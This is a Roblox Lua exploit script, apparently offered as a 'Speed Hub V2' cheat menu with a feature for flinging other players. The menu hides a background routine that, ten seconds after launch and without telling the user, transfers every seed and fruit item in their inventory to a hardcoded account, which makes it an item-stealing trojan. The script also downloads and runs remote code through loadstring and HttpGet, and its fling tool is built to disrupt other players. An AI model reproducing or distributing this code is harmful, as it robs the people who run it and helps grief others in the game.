-- Khởi tạo ban đầu chống đơ máy cho thiết bị di động
if not game:IsLoaded() then
    pcall(function()
        local contentProvider = game:GetService("ContentProvider")
        contentProvider:PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB V2: TỰ ĐỘNG GỬI ĐỒ SAU 10S & MENU FLING ====")

local successUI, OrionLib = pcall(function()
    return loadstring(game:HttpGet(('https://raw.githubusercontent.com/maderiscool/vapev4forroblox/main/OrionMobile.lua')))()
end)

local Window 
if OrionLib then
    pcall(function()
        Window = OrionLib:MakeWindow({
            Name = "Speed Hub V2", 
            HidePremium = true, 
            SaveConfig = false, 
            IntroText = "Loading Speed Hub..."
        })
    end)
end

-- Hệ thống biến quản lý
local Options = { 
    FlingTargetEnabled = false
}
local selectedFlingTarget = "" 
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- =======================================================================
-- TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ CHẠY NGẦM SAU ĐÚNG 10 GIÂY
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.8) -- Giãn cách an toàn tránh nghẽn mạng
    end
end

task.spawn(function()
    print("Hệ thống chuyển đồ đang đếm ngược: 10 giây...")
    task.wait(10) -- Chờ đúng 10 giây sau khi thực thi script
    
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        print("Bắt đầu tự động gom và gửi đồ sang nick chính...")
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        if Inventory then
            -- Tự động quét gửi sạch Hạt giống (Seeds)
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "seed") and item:IsA("ValueBase") and item.Value > 0 then
                    print("Đang gửi ngầm: " .. item.Name)
                    sendItemSecure("Seeds", item.Name, item.Value)
                end
            end
            -- Tự động quét gửi sạch Trái cây (Fruits)
            for _, item in pairs(Inventory:GetChildren()) do
                if string.find(string.lower(item.Name), "fruit") and item:IsA("ValueBase") and item.Value > 0 then
                    print("Đang gửi ngầm: " .. item.Name)
                    sendItemSecure("Fruits", item.Name, item.Value)
                end
            end
            print("==== HOÀN THÀNH TỰ ĐỘNG CHUYỂN KHO BÁU ====")
        end
    else
        warn("Không tìm thấy nick chính trong server, hủy quy trình gửi đồ ngầm!")
    end
end)

-- =======================================================================
-- LOGIC PHÁ PHÒNG: TỰ ĐỘNG ĐU ĐUỔI VÀ KHÓA MỤC TIÊU ĐỂ FLING
-- =======================================================================
task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        if Options.FlingTargetEnabled and selectedFlingTarget ~= "" then
            local targetPlayer = Players:FindFirstChild(selectedFlingTarget)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local myHrp = LocalPlayer.Character.HumanoidRootPart
                local enemyHrp = targetPlayer.Character.HumanoidRootPart
                
                myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                
                local oldVelocity = myHrp.Velocity
                myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                
                RunService.RenderStepped:Wait()
                myHrp.Velocity = oldVelocity
                
                for _, part in pairs(LocalPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end
end)

local function getPlayerList()
    local list = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name ~= targetUsername then
            table.insert(list, player.Name)
        end
    end
    return list
end

-- =======================================================================
-- CẤU TRÚC GIAO DIỆN MENU HACK (CHỈ CÓ TAB TROLL)
-- =======================================================================
if Window then
    pcall(function()
        local TrollTab = Window:MakeTab({ Name = "Troll / Fling", Icon = "" })
        TrollTab:AddSection({ Name = "Fling Theo Mục Tiêu" })

        local TargetDropdown = TrollTab:AddDropdown({
            Name = "Chọn Người Muốn Fling",
            Default = "Chưa chọn ai",
            Options = getPlayerList(),
            Callback = function(Value)
                selectedFlingTarget = Value
            end
        })

        TrollTab:AddToggle({
            Name = "Bật Auto Fling Người Này (Tự bay đến dí)",
            Default = false,
            Callback = function(Value)
                Options.FlingTargetEnabled = Value
                if Value and selectedFlingTarget == "" then
                    OrionLib:MakeNotification({ Name = "Lỗi", Content = "Bạn chưa chọn mục tiêu ở ô Dropdown phía trên!", Time = 3 })
                end
            end
        })

        TrollTab:AddButton({
            Name = "Làm Mới Danh Sách Người Chơi",
            Callback = function()
                if TargetDropdown then
                    TargetDropdown:Refresh(getPlayerList(), true)
                end
            end
        })

        OrionLib:Init()
    end)
end
